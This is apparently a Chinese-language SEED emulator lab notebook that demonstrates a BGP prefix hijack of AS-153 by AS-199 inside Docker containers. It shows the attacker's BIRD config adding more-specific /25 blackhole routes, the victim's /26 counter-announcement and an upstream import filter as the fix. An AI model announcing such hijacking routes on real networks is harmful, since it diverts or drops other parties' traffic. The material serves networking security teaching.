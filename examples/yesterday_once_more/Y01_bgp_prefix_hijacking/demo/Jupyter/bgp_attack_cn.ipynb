{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c7c3200f-cd40-4986-b1c3-cb9432bc8b1e",
   "metadata": {},
   "source": [
    "# BGP 网络前缀劫持攻击"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "550306c9-42a0-4671-b72c-f0a302171b51",
   "metadata": {},
   "source": [
    "## 设置环境\n",
    "\n",
    "首先我们需要把仿真器运行起来。\n",
    "\n",
    "在这个实验中，我们用 AS-199 来劫持 AS-153 的 IP 前缀（`10.153.0.0/24`）。为了帮助观察 BGP 劫持的效果，我们先从一台机器上发包给 AS-153 的机器。在 Internet Map 上我们应该可以看到数据包的流动（在 Filter 栏填入 `icmp`，加回车）：\n",
    "\n",
    "如果您使用自己的 VM 连入仿真器网络，您可以在自己的 VM 中去访问 `10.153.0.71` 这台机器。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f0fcaf62-fe43-4cbc-9271-59678efb1155",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash --bg\n",
    "docker exec as151h-host_0-10.151.0.71 ping 10.153.0.71"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "488c08d5-11b1-4f64-afe6-70004ace09bf",
   "metadata": {},
   "source": [
    "## 1. 劫持 AS-153\n",
    "\n",
    "第一步：攻击者是 AS-199， 所以我们先获取 AS-199 的 BGP 配置文件，对其进行修改。可以通过下面的命令从仿真器里获得配置文件。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5cea8958-4fd3-4a7f-955b-c990cd5a48e5",
   "metadata": {},
   "outputs": [],
   "source": [
    "!docker cp as199brd-attacker-bgp-10.199.0.254:/etc/bird/bird.conf ./as199_bird.conf_original"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1a1d9c2d-4a77-4c24-9846-b08343e6bd38",
   "metadata": {},
   "source": [
    "第二步：我们将下面的配置内容加到 AS-199 的 BGP 配置文件的最后。这些配置对 `10.153.0.0/24` 网络进行了劫持"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fb8d0597-6ce9-4d63-9528-b059f4469f58",
   "metadata": {},
   "source": [
    "```\n",
    "##############################################\n",
    "# Added BGP Attack\n",
    "# Hijack AS153's network prefix 10.153.0/24\n",
    "##############################################\n",
    "\n",
    "protocol static {\n",
    "  ipv4 { table t_bgp;  };\n",
    "  route 10.153.0.0/25 blackhole   {\n",
    "      bgp_large_community.add(LOCAL_COMM);\n",
    "  };\n",
    "  route 10.153.0.128/25 blackhole {\n",
    "      bgp_large_community.add(LOCAL_COMM);\n",
    "  };\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1f159bd9-570d-462a-bc42-106f5b891741",
   "metadata": {},
   "source": [
    "第三步：完成了上面的修改后将改过后的 BGP 配置文件拷贝回 AS-199，然后重启 AS-199 的 BGP 守护进程。我们把修改过的配置文件放在了 `as199brd_bird.conf_malicious` 中。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c90eb559-b571-499f-914f-0219712342fa",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "docker cp  as199brd_bird.conf_malicious as199brd-attacker-bgp-10.199.0.254:/etc/bird/bird.conf\n",
    "docker exec as199brd-attacker-bgp-10.199.0.254 birdc configure"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "75fa08d8-e9d2-4af6-96ba-f21725823f0a",
   "metadata": {},
   "source": [
    "第四步：从 Internet Map 上我们可以看到数据包的流向改变了，流向了 AS-199。现在在任何一台机器是 `ping 10.153.0.71`, 都会发现没有回复。我们可以去看一下 `as3brd-r103-10.103.0.3` 上的路由（这是一个 transit 自治系统），我们可以看到网络 AS-153 的网络有 3 个记录，其中 `10.153.0.0/25` 和 `10.153.0.128/25` 完全覆盖了 `10.153.0.0/24`。从记录可以看出，去往前两个地址的下一跳路由（`10.3.0.254`）和去往 `10.153.0.0/24` 的下一跳路由（`10.3.3.253`）是不一样的，这说明去往 AS-153 的包改道了。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26ded91b-79f1-44c9-b493-1bb4d22ca6b8",
   "metadata": {},
   "outputs": [],
   "source": [
    "!docker exec as3brd-r103-10.103.0.3 ip route"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6a4d06ba-1423-42bf-a41b-b1f64854801b",
   "metadata": {},
   "source": [
    "## 2. AS-153 的反击"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ad994221-fcbb-46bb-9702-538dd3727f43",
   "metadata": {},
   "source": [
    "第一步：AS-153 可以用同样的方法将自己的网络劫持回来。只要在自己的 BGP 配置文件中加入下面的内容即可，然后重启 BGP 守护进程。\n",
    "\n",
    "```\n",
    "#########################################\n",
    "# Added for BGP Attack\n",
    "# Fight back\n",
    "#########################################\n",
    "\n",
    "protocol static {\n",
    "  ipv4 { table t_bgp; };\n",
    "  route 10.153.0.0/26 via \"net0\" {\n",
    "           bgp_large_community.add(LOCAL_COMM);\n",
    "  };\n",
    "  route 10.153.0.64/26 via \"net0\" {\n",
    "           bgp_large_community.add(LOCAL_COMM);\n",
    "  };\n",
    "  route 10.153.0.128/26 via \"net0\" {\n",
    "           bgp_large_community.add(LOCAL_COMM);\n",
    "  };\n",
    "  route 10.153.0.192/26 via \"net0\" {\n",
    "           bgp_large_community.add(LOCAL_COMM);\n",
    "  };\n",
    "}\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "02f6447f-d31e-449e-96ac-e582b1332a7c",
   "metadata": {},
   "source": [
    "第二步：我们已经将修改过的配置放在了 `as153brd_bird.conf_fightback` 中，只要把它拷贝回 AS-153 的容器就可以。运行完下面的命令后，从 Internet Map 上我们可以看到数据包的流向改变了，重新流向了 AS-153。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "45708418-b20d-4de9-a55d-9de9e4e1d6dc",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "docker cp as153brd_bird.conf_fightback as153brd-router0-10.153.0.254:/etc/bird/bird.conf\n",
    "docker exec as153brd-router0-10.153.0.254 birdc configure"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "97c29273-12d5-4af6-8ebb-bfcca5a2ec32",
   "metadata": {},
   "source": [
    "## 3. 让 AS-199 的上游服务商来解决问题"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "48d12f6d-9ca1-44af-8f17-2d67fc3238da",
   "metadata": {},
   "source": [
    "第一步：在做这个任务之前，我们先恢复 AS-153 的配置，这样攻击仍然有效，我们就可以让上游服务商来解决这个问题。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72df0c9d-9fca-4e41-b7ae-da6c0ff3d207",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "docker cp as153brd_bird.conf_original as153brd-router0-10.153.0.254:/etc/bird/bird.conf\n",
    "docker exec as153brd-router0-10.153.0.254 birdc configure"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "85df351e-b883-4574-aabf-b0e8ccb8f801",
   "metadata": {},
   "source": [
    "第二步：我们先来看一下 AS-199 的上游服务商是谁。下面的命令在 AS-199 的 BGP 路由器向 BGP 的守护进程 `bird` 查询信息。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "be755bed-b127-43c9-9f96-f9e8764d77c0",
   "metadata": {},
   "outputs": [],
   "source": [
    "!docker exec as199brd-attacker-bgp-10.199.0.254 birdc show protocols"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9c3cf28f-a847-45b5-b2e4-4c2b7829398c",
   "metadata": {},
   "source": [
    "从结果我们可以看到只有一个 BGP session，也就是 `u_as11`，这是 AS-11。这个自治系统在多处有 BGP 路由器，从 Internet Map 上可以看到，AS-199 和 AS-11 是在 IX-105 进行的对等连接（peering）。我们可以找到相应的容器的名字（`as11brd-r105-10.105.0.11`）："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "58e51d16-b827-42e3-a5bf-27c6c151d9ab",
   "metadata": {},
   "outputs": [],
   "source": [
    "!docker ps | grep as11"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3856f1aa-b336-4a5d-a1fe-caf36c2637e9",
   "metadata": {},
   "source": [
    "第三步：我们可以获取 `as11brd-r105-10.105.0.11` 的 BGP 配置文件，加入一行到它和 AS-199 的配置里（见下面的带注释的行）。这行判断 AS-199 对外 announce 的网络前缀是否是 `10.199.0.0/24`，如果不是的话就拒绝接受这个 BGP announcement。\n",
    "```\n",
    "protocol bgp c_as199 {\n",
    "    ipv4 {\n",
    "        table t_bgp;\n",
    "        import filter {\n",
    "            bgp_large_community.add(CUSTOMER_COMM);\n",
    "            bgp_local_pref = 30;\n",
    "            if (net != 10.199.0.0/24) then reject;  # Added to fix the problem\n",
    "            accept;\n",
    "        };\n",
    "        export all;\n",
    "        next hop self;\n",
    "    };\n",
    "    local 10.105.0.11 as 11;\n",
    "    neighbor 10.105.0.199 as 199;\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "be9f6b39-750a-4825-9b6e-d95c92b1ed6d",
   "metadata": {},
   "source": [
    "第四步：把修改过的 BGP 配置文件传回 `as2brd-r105-10.105.0.2`。我们修改过的文件是 `as2brd-r105_bird.conf_fixproblem`。运行完下面的命令，从 Internet Map 上我们可以看到数据包的流向改变了，重新流向了 AS-153。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f4850a7b-f808-4840-9aa9-0980f5d8163b",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "docker cp  as11brd-r105_bird.conf_fixproblem as11brd-r105-10.105.0.11:/etc/bird/bird.conf\n",
    "docker exec as11brd-r105-10.105.0.11 birdc configure"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "seedpydev",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.18"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
